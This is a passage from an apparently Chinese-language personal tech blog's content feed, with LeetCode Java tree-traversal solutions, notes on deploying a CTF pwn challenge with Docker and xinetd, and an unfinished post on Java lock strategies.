class_">int</span>[]&#123;entry.getKey(),entry.getValue()&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] ans = <span class="keyword">new</span> <span class="title class_">int</span>[k];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=k-<span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="comment">//依次弹出小顶堆,先弹出的是堆的根,出现次数少,后面弹出的出现次数多</span></span><br><span class="line">            ans[i] = pq.poll()[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来二叉树基础遍历 递归秒了<br>递归注意三要素（来自代码随想录）<br><strong>1.确定递归函数的参数和返回值</strong><br><strong>2.确定终止条件</strong><br><strong>3.确定单层递归的逻辑</strong></p><h4 id="二叉树的前序遍历"><a href="#二叉树的前序遍历" class="headerlink" title="二叉树的前序遍历"></a>二叉树的前序遍历</h4><p>link：<a href="https://leetcode.cn/problems/binary-tree-preorder-traversal/description/">144. 二叉树的前序遍历 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><h6 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h6><p>使用ArrayList</p><p><strong>动态大小</strong>：<code>ArrayList</code> 可以根据需要动态调整大小，适合在不知道最终节点数目的情况下使用。</p><p><strong>快速随机访问</strong>：<code>ArrayList</code> 提供 O(1) 的时间复杂度来访问元素，这在需要频繁读取结果时非常高效。</p><p><strong>简单易用</strong>：<code>ArrayList</code> 的 API 设计简单，提供了方便的方法（如 <code>add</code>）来添加元素。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">preorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        preOrder(root,list);</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//前序遍历递归 中左右 无返回值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preOrder</span><span class="params">(TreeNode cur,List&lt;Integer&gt; result)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(cur == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        result.add(cur.val);</span><br><span class="line">        preOrder(cur.left,result);</span><br><span class="line">        preOrder(cur.right,result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二叉树的中序遍历"><a href="#二叉树的中序遍历" class="headerlink" title="二叉树的中序遍历"></a>二叉树的中序遍历</h4><p>link：<a href="https://leetcode.cn/problems/binary-tree-inorder-traversal/description/">94. 二叉树的中序遍历 - 力扣（LeetCode）</a></p><h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        inOrder(root,list);</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">inOrder</span><span class="params">(TreeNode cur,List&lt;Integer&gt; list)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(cur == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        inOrder(cur.left,list);</span><br><span class="line">        list.add(cur.val);</span><br><span class="line">        inOrder(cur.right,list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二叉树的后序遍历"><a href="#二叉树的后序遍历" class="headerlink" title="二叉树的后序遍历"></a>二叉树的后序遍历</h4><p>link：<a href="https://leetcode.cn/problems/binary-tree-postorder-traversal/description/">145. 二叉树的后序遍历 - 力扣（LeetCode）</a></p><h5 id="思路分析-3"><a href="#思路分析-3" class="headerlink" title="思路分析"></a>思路分析</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">postorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        postOrder(root,list);</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postOrder</span><span class="params">(TreeNode cur,List&lt;Integer&gt; list)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(cur == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        postOrder(cur.left,list);</span><br><span class="line">        postOrder(cur.right,list);</span><br><span class="line">        list.add(cur.val);  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm0.0</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm0.0/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm0.0/</url>
      
        <content type="html"><![CDATA[<h3 id="闲言碎语"><a href="#闲言碎语" class="headerlink" title="闲言碎语"></a>闲言碎语</h3><p>​思来想去还是想把之前打卡的内容搬过来（毕竟博客修修补补还是勉强可以凑合看 笑）还是作为自己的点滴记录吧.【是的看到的日期一样的纯属是懒得改 不要学习懒惰】<br>​wi师傅说毕设手搓一个自己的博客系统GitHub上能有几千star那包过的，倒是有这么个想法，说不定自己哪天也可以实现呢.<br>​之后搬运过来的内容也算是复习了，希望自己能在薄弱的方面越来越好.【这个时候在Harmony开发课上插着耳机一个人passion hh】</p><p>希望自己这次能真正坚持下来.<br>(在学习的学弟学妹们也继续加油哦 期待你们成为自己理想中的pwn✌)</p><p>共勉.</p>]]></content>
      
      
      <categories>
          
          <category> 碎片 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker部署小记</title>
      <link href="/2024/11/04/Docker%E9%83%A8%E7%BD%B2%E5%B0%8F%E8%AE%B0/"/>
      <url>/2024/11/04/Docker%E9%83%A8%E7%BD%B2%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>上次出题还是上次，好多指令已经记不清了.<br>暂时写在这里，给自己也给以后的你们查阅.</p><h3 id="有用的工具"><a href="#有用的工具" class="headerlink" title="有用的工具"></a>有用的工具</h3><p>如果你去喜欢的浏览器搜索，不难发现xinetd确实很实用.(笑)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Eadom/ctf_xinetd.git</span><br></pre></td></tr></table></figure><p>安装之后发现长这样<br><img src="/../imgs/2024-10/QQ%E6%88%AA%E5%9B%BE20241107230639.png"></p><p>手搓docker-compose.yml（不会也可以找人机hh）.</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">    <span class="attr">pwn:</span></span><br><span class="line">        <span class="attr">build:</span> <span class="string">./</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">pwn</span> <span class="comment">#这里的image写自己创建的镜像名</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;60001:9999&quot;</span></span><br><span class="line">        <span class="attr">pids_limit:</span> <span class="number">1024</span></span><br><span class="line">        <span class="comment"># cpus: 0.5</span></span><br><span class="line">        <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">        <span class="comment"># privileged: true</span></span><br></pre></td></tr></table></figure><p><strong>ctf.xinetd文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">service ctf</span><br><span class="line">&#123;</span><br><span class="line">    disable = no</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    wait        = no</span><br><span class="line">    user        = root</span><br><span class="line">    type        = UNLISTED</span><br><span class="line">    port        = 9999</span><br><span class="line">    bind        = 0.0.0.0</span><br><span class="line">    server      = /usr/sbin/chroot</span><br><span class="line">    # replace helloworld to your program</span><br><span class="line">    server_args = --userspec=1000:1000 /home/ctf ./oneChance</span><br><span class="line">    banner_fail = /etc/banner_fail</span><br><span class="line">    # safety options</span><br><span class="line">    per_source= 10 # the maximum instances of this service per source IP address</span><br><span class="line">    rlimit_cpu= 20 # the maximum number of CPU seconds that the service may use</span><br><span class="line">    #rlimit_as  = 1024M # the Address Space resource limit for the service</span><br><span class="line">    #access_times = 2:00-9:00 12:00-24:00</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>.&#x2F;+自己编译好的ELF文件</strong><br>如果涉及到堆的题目 修改Dockerfile至与红框内容一致.(18.04以上的都和这个保持一致)</p><p><img src="/../imgs/2024-10/image-20241107234628376.png" alt="image-20241107234628376"></p><p><strong>start.sh文件</strong></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Add your startup script</span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="string">sed</span> <span class="string">-i</span> <span class="string">&quot;s/cdusec&#123;pwntestflag&#125;/$FLAG/&quot;</span> <span class="string">/home/ctf/flag</span></span><br><span class="line"><span class="string">export</span> <span class="string">FLAG=&quot;&quot;</span></span><br><span class="line"><span class="comment"># DO NOT DELETE</span></span><br><span class="line"><span class="string">/etc/init.d/xinetd</span> <span class="string">start;</span></span><br><span class="line"><span class="string">sleep</span> <span class="string">infinity;</span></span><br></pre></td></tr></table></figure><h4 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p &quot;127.0.0.1:8888:9999&quot; -h &quot;pwn&quot; --name=&quot;pwn&quot; pwn</span><br></pre></td></tr></table></figure><p>-p后面的内容就是把9999端口映射到8888端口（可改）<br>–name后面的内容是指定<a href="https://cloud.tencent.com/product/tke?from=10680">容器</a>的名称，而-h是指定容器的hostname，而最后的是image的名字，要根据建的镜像名进行修改.</p><p><strong>部署参考文章</strong>：<a href="https://blog.csdn.net/qq_52820087/article/details/127851116">web和pwn题的简单动态flag实现_gzctf-CSDN博客</a></p><h3 id="实用的命令"><a href="#实用的命令" class="headerlink" title="实用的命令"></a>实用的命令</h3><p>You’re master！</p><h5 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">我的系统环境：Ubuntu 22.04</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新软件包</span></span><br><span class="line">sudo apt-get update</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装docker</span></span><br><span class="line">sudo apt-get install docker.io</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查docker是否安装成功</span></span><br><span class="line">docker version</span><br></pre></td></tr></table></figure><h5 id="制作镜像并上传"><a href="#制作镜像并上传" class="headerlink" title="制作镜像并上传"></a>制作镜像并上传</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t &quot;pwn&quot; .</span><br></pre></td></tr></table></figure><p><strong>注意后面的 .</strong></p><h5 id="查看本机所有镜像"><a href="#查看本机所有镜像" class="headerlink" title="查看本机所有镜像"></a>查看本机所有镜像</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><h5 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run</span><br></pre></td></tr></table></figure><h5 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop</span><br></pre></td></tr></table></figure><h5 id="强制停止容器"><a href="#强制停止容器" class="headerlink" title="强制停止容器"></a>强制停止容器</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker kill </span><br></pre></td></tr></table></figure><h5 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm</span><br></pre></td></tr></table></figure><h5 id="强制删除镜像"><a href="#强制删除镜像" class="headerlink" title="强制删除镜像"></a>强制删除镜像</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi -f &lt;IMAGE_ID&gt;</span><br></pre></td></tr></table></figure><h5 id="删除所有未被使用的镜像"><a href="#删除所有未被使用的镜像" class="headerlink" title="删除所有未被使用的镜像"></a>删除所有未被使用的镜像</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image prune -a</span><br></pre></td></tr></table></figure><h5 id="删除所有镜像"><a href="#删除所有镜像" class="headerlink" title="删除所有镜像"></a>删除所有镜像</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi -f $(docker images -q)</span><br></pre></td></tr></table></figure><p>这个命令会删除包括 <code>&lt;none&gt;</code> 标签在内的所有镜像.<br>其中两个具体什么意思其实也可以猜出来，搞不赢也可以去STFW.</p><h5 id="进入-Docker-容器以查看其中的内容"><a href="#进入-Docker-容器以查看其中的内容" class="headerlink" title="进入 Docker 容器以查看其中的内容"></a>进入 Docker 容器以查看其中的内容</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it &lt;CONTAINER_ID&gt; /bin/bash</span><br></pre></td></tr></table></figure><h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>操作中特别注意权限问题（提权和可777）,以及预留够足够的空间.<br>上传到平台一定要进行好测试.</p>]]></content>
      
      
      <categories>
          
          <category> 碎片 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java多线程_0x9_</title>
      <link href="/2024/09/11/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%B9%9D/"/>
      <url>/2024/09/11/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%B9%9D/</url>
      
        <content type="html"><![CDATA[<h3 id="多线程篇九"><a href="#多线程篇九" class="headerlink" title="多线程篇九"></a>多线程篇九</h3><h4 id="常见的锁策略"><a href="#常见的锁策略" class="headerlink" title="常见的锁策略"></a>常见的锁策略</h4><p>虽然我们开发者一般只关注如何使用锁，但设计锁我们也需要有一定的了解.</p><h5 id="乐观锁和悲观锁"><a href="#乐观锁和悲观锁" class="headerlink" title="乐观锁和悲观锁"></a>乐观锁和悲观锁</h5><p>顾名思义，两个锁一个是考虑的最优情况一个考虑最坏情况.</p><h6 id="乐观锁"><a href="#乐观锁" class="headerlink" title="乐观锁"></a>乐观锁</h6><p>在加锁之前，假设数据一般情况下不会产生冲突，只在数据进行返回更新的时候进行检查校验，如果发生并行冲突就返回错误信息，让用户重新进行决策.（就是加锁之前预估出现所冲突的概率不大所以在加锁前不会进行太多的工作【加锁过程做的事少加锁的速度更快但是更容易引入一些其他问题消耗CPU资源】）<br>比如你想吃饭，但是食堂这个时候被军爷占领了，你觉得你去的过够早军爷抢不过你，直接冲去食堂，结果排上了长长的队伍.【没加锁但能识别数据冲突】</p><h6 id="悲观锁"><a href="#悲观锁" class="headerlink" title="悲观锁"></a>悲观锁</h6><p>在加锁之前，总假设数据从一开始就容易被修改，每次拿数据的时候就会加锁.想拿到这个数据只能等待阻塞拿到锁.（在加锁之前预估出现锁冲突的概率很大，加锁的时候会做更多的工作防止意外，此时加锁的速度可能更慢，但是整个过程中更不容易出现其他问题）<br>和上述同样的情况，为了防止空跑一趟你给可预定窗口发消息询问能否预定（相当于加锁）得到肯定答复之后会来取餐如果生意太火爆没回或者说不够预定的就下次再去这个窗口.</p><p><strong>Synchronized初始使用乐观锁策略.当发现锁竞争比较频繁的时候就会自动切换成悲观锁策略.</strong><br>当然这种相互结合的模式在实际应用中更具高效性.</p><h5 id="重量级锁和轻量级锁"><a href="#重量级锁和轻量级锁" class="headerlink" title="重量级锁和轻量级锁"></a>重量级锁和轻量级锁</h5><p>锁的核心特性——  “原子性”这样的机制追溯根源是CPU这样的硬件设备提供的.<br>CPU提供了”原子操作指令”<br>操作系统基于CPU原子指令，实现了mutex互斥锁.<br>JVM基于OS提供的互斥锁，实现了synchronized和ReentrankLock等关键字和类.<br>1</p><h6 id="重量级锁"><a href="#重量级锁" class="headerlink" title="重量级锁"></a>重量级锁</h6><p>适用于锁高竞争的场景.【开销较高】<br>加锁开销更大，加锁速度更慢.</p><p>加锁机制重度依赖了OS提供的mutex.<br>大量的内核态用户态切换.<br>很容易引发线程的调度.<br><strong>涉及用户态和内核态的切换成本高高高高</strong></p><h6 id="轻量级锁"><a href="#轻量级锁" class="headerlink" title="轻量级锁"></a>轻量级锁</h6><p>基于CAS操作的锁实现，适用于低竞争场景；可以避免阻塞，但在竞争激烈时会膨胀为重量级锁.</p><p>加锁机制尽可能不使用mutex尽量在用户态代码完成.搞不赢再用mutex.</p><p>少量的内核态用户态切换.<br>不态容易引发线程调度.<br><strong>synchronized开始时是一个轻量级锁，如果锁冲突比较严重就会变成重量级锁.</strong><br>加锁开销更小，加锁速度更快.</p><h6 id="挂起等待锁"><a href="#挂起等待锁" class="headerlink" title="挂起等待锁"></a><strong>挂起等待锁</strong></h6><p> 一种重量级锁的典型例子同时也是一种悲观锁.<br>进行挂起等待的时候需要内核调度器接入【此时需要的操作变多】真正获取到锁耗费的时间自然增长.<br><strong>适用锁竞争激烈的情况.</strong></p><h6 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a><strong>自旋锁</strong></h6><p>一种轻量级锁的实现同时也是一种乐观锁.<br>进行加锁的时候搭配while循环，如果加锁成功，结束循环.反之再次进行循环不放弃，再次尝试获取到锁.（坚强励志!）<br>这个反复执行的过程就称为”自旋”.一旦其他线程释放了锁就能立马拿到锁（舔的漂亮!bushi）<br><strong>使用前提是预期锁冲突不大，其他线程释放了锁不然死死循环太耗费CPU</strong><br><strong>synchronized 中的轻量级锁策略⼤概率就是通过⾃旋锁的⽅式实现.</strong></p><p><strong>悲观乐观是加锁之前对未发生的事情进行的评估.</strong><br><strong>轻重量级是加锁之后对结果的评价.</strong><br><u>synchronized是能自适应的锁，根据锁冲突的概率高还是低实现锁模式的切换</u></p><h5 id="公平锁非公平锁"><a href="#公平锁非公平锁" class="headerlink" title="公平锁非公平锁"></a>公平锁非公平锁</h5><p>和”线程饿死”有关，公平指的是先来后放到.<br>有A、B、C三个线程.A先尝试获取锁然后获取成功，B此时开始尝试获取锁，获取失败阻塞等待，然后C也尝试获取锁，仍然阻塞等待.<br><strong>两者没有好坏之分，关键看使用场景</strong></p><h6 id="公平锁"><a href="#公平锁" class="headerlink" title="公平锁"></a>公平锁</h6><p>遵守”先来后到”.A释放锁之后B先得到锁，把C晾在一边.</p><h6 id="非公平锁"><a href="#非公平锁" class="headerlink" title="非公平锁"></a>非公平锁</h6><p>不遵守”先来后到”.B和C公平竞争,两者都有可能获取到锁.<br><strong>synchronized是非公平锁.</strong></p><p><strong>站在系统原生锁的角度锁是非公平的【操纵系统内部的线程调度就是可以视为是随机的 想实现公平锁需要引入额外的数据结构(引入队列记录每个线程先后顺序)】</strong></p><h5 id="可重入锁和不可重入锁"><a href="#可重入锁和不可重入锁" class="headerlink" title="可重入锁和不可重入锁"></a>可重入锁和不可重入锁</h5><h6 id="可重入锁"><a href="#可重入锁" class="headerlink" title="可重入锁"></a>可重入锁</h6><p>顾名思义，”可以重新进入的锁”，允许同一个线程多次获取同一把锁.<br>一个线程针对一把锁可以连续加锁两次不会死锁即是可重入锁.</p><h6 id="不可重入锁"><a href="#不可重入锁" class="headerlink" title="不可重入锁"></a>不可重入锁</h6><p>跟上述情况相反.第二次加锁的时候会阻塞等待直到第一个锁释放，才会获取到第二个锁.但是该线程摆了什么也不想干，此时就会死锁.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第⼀次加锁, 加锁成功</span></span><br><span class="line">lock();</span><br><span class="line"><span class="comment">// 第⼆次加锁, 锁已经被占⽤, 阻塞等待. </span></span><br><span class="line">lock();</span><br></pre></td></tr></table></figure><p><strong>Linux提供的mutex是不可重入锁</strong><br><strong>synchronized是可重入锁.</strong></p><p><strong>Java⾥只要以Reentrant开头命名的锁都是可重⼊锁，</strong>⽽且JDK提供的所有现成的Lock实现类.</p><h5 id="普通互斥锁读写锁"><a href="#普通互斥锁读写锁" class="headerlink" title="普通互斥锁读写锁"></a>普通互斥锁读写锁</h5><h6 id="普通互斥锁"><a href="#普通互斥锁" class="headerlink" title="普通互斥锁"></a>普通互斥锁</h6><p>类似synchronized操作涉及到的加锁和解锁.</p><h6 id="读写锁"><a href="#读写锁" class="headerlink" title="读写锁"></a>读写锁</h6><p>多线程之间，数据的读取⽅之间不会产⽣线程安全问题，但数据的写⼊⽅互相之间以及和读者之间都 需要进⾏互斥。如果两种场景下都⽤同⼀个锁，就会产⽣极⼤的性能损耗。所以读写锁因此⽽产⽣.</p><p>1）加读锁<br>2）加写锁<br><strong>读锁和读锁之间不会产生冲突（不会阻塞）</strong><br><strong>写锁和写锁之间会产生锁冲突（会阻塞）</strong><br><strong>读锁和写锁之间会出现锁冲突（会阻塞）</strong></p><p>一个线程加读锁的时候另一个线程只能读不能写.<br>一个线程加写锁的时候另一个线程不能写也不能读.</p><p><strong>synchronized不是读写锁.</strong></p><h6 id="引入读写锁原因"><a href="#引入读写锁原因" class="headerlink" 